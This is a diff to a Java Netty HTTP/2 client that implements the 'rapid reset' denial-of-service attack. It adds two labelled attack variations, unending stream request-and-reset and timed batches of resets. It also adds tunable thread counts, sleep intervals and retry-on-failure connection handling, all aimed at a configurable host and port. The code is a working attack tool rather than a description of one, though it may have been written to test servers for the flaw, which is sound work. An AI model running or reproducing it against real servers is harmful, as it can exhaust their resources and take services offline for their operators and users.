@@ -70,13 +70,21 @@ public final class Http2Client {
     static final int PORT = Integer.parseInt(System.getProperty("port", SSL? "8443" : "8080"));
     static final String URL = System.getProperty("url", "/whatever");
     static final int TRIES = Integer.parseUnsignedInt(System.getProperty("tries", "10"));
+    static final boolean ENABLE_LOGGING = Boolean.getBoolean("enable_frame_logging");
+    static final long STREAM_SPREAD_SLEEP = Long.parseUnsignedLong(System.getProperty("stream_spread_sleep", "20"));
+    static final int THREAD_NUMBER = Integer.parseUnsignedInt(System.getProperty("thread_number", "100"));
+    static final long BATCH_SPREAD_SLEEP = Long.parseUnsignedLong(System.getProperty("batch_spread_sleep", "5000"));
+    // Different attack variations have been found
+    // 1 Unending stream requests and resets
+    // 2 Batch of stream requests/resets
+    static final int ATTACK_VARIATION = Integer.parseUnsignedInt(System.getProperty("attack", "1"));
 
     public static void main(String[] args) throws Exception {
         // Configure SSL.
         final SslContext sslCtx = initializeSSL();
         // Create Netty objects for connections
         EventLoopGroup workerGroup = new NioEventLoopGroup();
-        Http2ClientInitializer initializer = new Http2ClientInitializer(sslCtx, Integer.MAX_VALUE, URL);
+        Http2ClientInitializer initializer = new Http2ClientInitializer(sslCtx, Integer.MAX_VALUE, URL, ENABLE_LOGGING);
         HttpResponseHandler responseHandler = initializer.responseHandler();
         // Create request specific config
         HttpScheme scheme = SSL ? HttpScheme.HTTPS : HttpScheme.HTTP;
@@ -86,11 +94,21 @@ public final class Http2Client {
         System.err.println("Starting rapid reset requests...");
         try {
             for (int i = 0; i < TRIES; i++) {
-                // Create and executor service for managing threads
-                ExecutorService executor = Executors.newFixedThreadPool(100);
+                System.out.println("Starting connection number: " + (i+1));
+                
                 // Open connection to server
-                Channel channel = openConnection(workerGroup, initializer);
-                System.out.println("Connected to [" + HOST + ':' + PORT + ']');
+                Channel channel;
+                try {
+                    channel = openConnection(workerGroup, initializer);
+                    System.out.println("Connected to [" + HOST + ':' + PORT + ']');
+                } catch(Exception e){
+                    System.out.println("Catched exception " + e + "while connecting to " +
+                        "[" + HOST + ':' + PORT + ']');
+                    continue;
+                }
+
+                // Create an executor service for managing threads
+                ExecutorService executor = Executors.newFixedThreadPool(THREAD_NUMBER);
 
                 // Wait for the HTTP/2 upgrade to occur.
                 Http2SettingsHandler http2SettingsHandler = initializer.settingsHandler();
@@ -102,22 +120,19 @@ public final class Http2Client {
                     continue;
                 }
 
-                // Start all the streams possibly allowed and cancel them
-                long maxConcurrentStreams = initializer.connectionHandler().connection().remote().maxActiveStreams();
-                System.out.println("Going until streams: " + maxConcurrentStreams);
-                // Think about running this in a thread concurrently with other threads
-                // To have concurrent streams running at the same time
-                for (int streamId = 3; streamId / 2 + 1 < maxConcurrentStreams; streamId += 2) {
-                    if (!channel.isOpen()) {
-                        System.out.println("Channel: "+ channel + " was closed working on stream: " + streamId);
+                switch(ATTACK_VARIATION){
+                    case 1:
+                        runRapidResetVariation(initializer, http2SettingsHandler.ctx, request, executor);
                         break;
-                    }
-                    executor.submit(new RequestAndResetCallable(request, http2SettingsHandler.ctx,
-                        initializer, channel, streamId));
-                    Thread.sleep(20);
+                    case 2:
+                        runRapidResetBatchVariation(initializer, http2SettingsHandler.ctx, request, executor);
+                        break;
+                    default:
+                        System.out.println("Invalid attach variation: "+ATTACK_VARIATION);
+                        break;
                 }
 
-                System.out.println("Finished HTTP/2 request");
+                System.out.println("Finished HTTP/2 request: " + channel);
 
                 // Wait until the connection is closed. Possibly start another connection
                 channel.close();
@@ -175,16 +190,47 @@ public final class Http2Client {
         return request;
     }
 
-    // Think about running this in a thread concurrently with other threads for stream IDs all the way
-    // up to max concurrent streams
-    public static void sendDummyRequestAndReset(FullHttpRequest request, ChannelHandlerContext ctx,
-            Http2ClientInitializer initializer, Channel channel, int streamId) {
-        HttpResponseHandler responseHandler = initializer.responseHandler();
-        responseHandler.put(streamId, channel.write(request), channel.newPromise());
-        channel.flush();
-        initializer.connectionHandler().resetStream(ctx, streamId, 0, channel.newPromise());
+    public static void runRapidResetVariation(Http2ClientInitializer initializer, ChannelHandlerContext ctx, FullHttpRequest request, ExecutorService executor) throws Exception{
+        // Variation 1 rapid unending reset
+        // Start all the streams possibly allowed and reset them straight after requesting
+        long maxConcurrentStreams = initializer.connectionHandler().connection().remote().maxActiveStreams();
+        Channel channel = ctx.channel();
+        System.out.println("Going until streams: " + maxConcurrentStreams);
+        // To have concurrent streams running at the same time
+        for (int streamId = 3; streamId / 2 + 1 < maxConcurrentStreams; streamId += 2) {
+            if (!channel.isOpen()) {
+                System.out.println("Channel: "+ channel + " was closed working on stream: " + streamId);
+                break;
+            }
+            executor.submit(new RequestAndResetCallable(request, ctx,
+                initializer, channel, streamId));
+            Thread.sleep(STREAM_SPREAD_SLEEP);
+        }
     }
 
+    public static void runRapidResetBatchVariation(Http2ClientInitializer initializer, ChannelHandlerContext ctx, FullHttpRequest request, ExecutorService executor) throws Exception{
+        // Variation 2 rapid batch reset
+        // Start a batch of rapid resets then rest and repeat next batch
+        long maxConcurrentStreams = initializer.connectionHandler().connection().remote().maxActiveStreams();
+        int streamId = 3;
+        boolean shouldStop = false;
+        Channel channel = ctx.channel();
+        System.out.println("Going until streams: " + maxConcurrentStreams + " with batches of: "+THREAD_NUMBER + " and pauses of: "+BATCH_SPREAD_SLEEP);
+        for(int currentBatch = 1; streamId / 2 + 1 < maxConcurrentStreams || !shouldStop;  currentBatch ++){
+            for (; streamId / 2 + 1 < currentBatch * THREAD_NUMBER; streamId += 2) {
+                if (!channel.isOpen()) {
+                    System.out.println("Channel: "+ channel + " was closed working on stream: " + streamId);
+                    shouldStop = true;
+                    break;
+                }
+                executor.submit(new RequestAndResetCallable(request, ctx,
+                    initializer, channel, streamId));
+                Thread.sleep(STREAM_SPREAD_SLEEP);
+            }
+            System.out.println("Finished batch: " + currentBatch + " and resting: " + BATCH_SPREAD_SLEEP + " ms...");
+            Thread.sleep(BATCH_SPREAD_SLEEP);
+        }
+    }
 
     private static class RequestAndResetCallable implements Callable<Void> {
 
@@ -212,8 +258,6 @@ public final class Http2Client {
             }
             HttpResponseHandler responseHandler = initializer.responseHandler();
             ChannelFuture future = channel.writeAndFlush(request);
-            // responseHandler.put(streamId, future, channel.newPromise());
-            // channel.flush();
             // Await until write is finish to write the reset
             try {
                 future.await(1000);
